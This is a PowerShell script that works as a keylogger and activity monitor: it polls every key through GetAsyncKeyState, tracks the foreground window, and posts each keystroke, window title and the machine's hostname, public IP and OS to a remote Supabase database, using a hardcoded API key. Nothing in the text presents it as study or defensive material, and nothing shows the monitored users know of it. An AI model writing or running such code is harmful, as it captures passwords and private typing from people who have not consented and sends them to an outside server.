Add-Type @"
using System;
using System.Runtime.InteropServices;
public class KeyboardListener {
    [DllImport("user32.dll")]
    public static extern short GetAsyncKeyState(int vKey);
}
"@

# Supabase setup
$SUPABASE_URL = "https://vxevbehqnjhqodybymto.supabase.co"
$SUPABASE_KEY = "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJzdXBhYmFzZSIsInJlZiI6InZ4ZXZiZWhxbmpocW9keWJ5bXRvIiwicm9sZSI6ImFub24iLCJpYXQiOjE3NDg5NTYzNDYsImV4cCI6MjA2NDUzMjM0Nn0.BHAltakl2-UqwFjMFvKJYIWw9NcZ064N5BWt1Z6uyiE"
$headers = @{
    "apikey"        = $SUPABASE_KEY
    "Authorization" = "Bearer $SUPABASE_KEY"
    "Content-Type"  = "application/json"
}

# Get device info
$hostname = $env:COMPUTERNAME
$ip = (Invoke-RestMethod -Uri "https://api.ipify.org?format=json").ip
$os = (Get-CimInstance Win32_OperatingSystem).Caption

# Register device
$devicePayload = @{
    hostname    = $hostname
    ip_address  = $ip
    os          = $os
    location    = "Lab-1"
    last_seen   = (Get-Date).ToString("o")
} | ConvertTo-Json -Depth 3

$response = Invoke-RestMethod -Uri "$SUPABASE_URL/rest/v1/devices?select=id&hostname=eq.$hostname" -Headers $headers -Method Get
if ($response) {
    $device_id = $response[0].id
} else {
    $result = Invoke-RestMethod -Uri "$SUPABASE_URL/rest/v1/devices" -Headers $headers -Method Post -Body $devicePayload
    $device_id = $result.id
}

function Send-KeyLog($key, $window) {
    $payload = @{
        device_id = $device_id
        keystroke = $key
        app_name  = $window
        timestamp = (Get-Date).ToString("o")
    } | ConvertTo-Json -Depth 3
    Invoke-RestMethod -Uri "$SUPABASE_URL/rest/v1/key_logs" -Headers $headers -Method Post -Body $payload | Out-Null
}

function Send-ActivityLog($windowTitle, $processName) {
    $payload = @{
        device_id    = $device_id
        window_title = $windowTitle
        process_name = $processName
        timestamp    = (Get-Date).ToString("o")
    } | ConvertTo-Json -Depth 3
    Invoke-RestMethod -Uri "$SUPABASE_URL/rest/v1/activity_logs" -Headers $headers -Method Post -Body $payload | Out-Null
}

$prevTitle = ""
while ($true) {
    $win = Get-Process | Where-Object { $_.MainWindowHandle -ne 0 } | Sort-Object StartTime -Descending | Select-Object -First 1
    if ($win) {
        $title = $win.MainWindowTitle
        $proc  = $win.ProcessName
        if ($title -ne $prevTitle) {
            Send-ActivityLog -windowTitle $title -processName $proc
            $prevTitle = $title
        }
    }

    foreach ($ascii in 8..222) {
        $state = [KeyboardListener]::GetAsyncKeyState($ascii)
        if ($state -eq -32767) {
            $key = [char]$ascii
            if ($ascii -eq 13) { $key = "[ENTER]" }
            elseif ($ascii -eq 8) { $key = "[BACKSPACE]" }
            Send-KeyLog -key $key -window $proc
        }
    }

    Start-Sleep -Milliseconds 250
}
